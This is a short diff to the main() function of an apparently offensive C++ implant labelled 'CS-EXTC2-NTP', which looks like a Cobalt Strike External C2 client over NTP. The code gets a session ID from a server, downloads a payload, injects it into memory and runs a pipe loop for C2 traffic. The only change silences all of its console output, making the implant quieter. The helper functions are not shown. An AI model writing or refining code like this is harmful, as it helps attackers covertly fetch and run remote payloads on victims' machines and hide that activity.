@@ -16,23 +16,23 @@ CS-EXTC2-NTP
 
 int main() {
 
-	std::cout << "[>] Started" << std::endl;
+	//std::cout << "[>] Started" << std::endl;
 
 	//0. Get Session ID from server
 	std::vector<uint8_t> clientId = getId();
 
 	//1. Get Payload
-	std::cout << "[>] Getting Payload" << std::endl;
+	//std::cout << "[>] Getting Payload" << std::endl;
 	std::vector<uint8_t> payloadBytes = getPayload(clientId);
 
 	//2. run payload
-	std::cout << "[>] Injecting Payload" << std::endl;
+	//std::cout << "[>] Injecting Payload" << std::endl;
 	injector(payloadBytes);
 
 	//3. read from pipe & start with chunk loop
-	std::cout << "[>] Pipe Loop Started" << std::endl;
+	//std::cout << "[>] Pipe Loop Started" << std::endl;
 
 	pipeLoop(clientId);
 
-	std::cout << "[+] Finished!" << std::endl;
+	//std::cout << "[+] Finished!" << std::endl;
 }
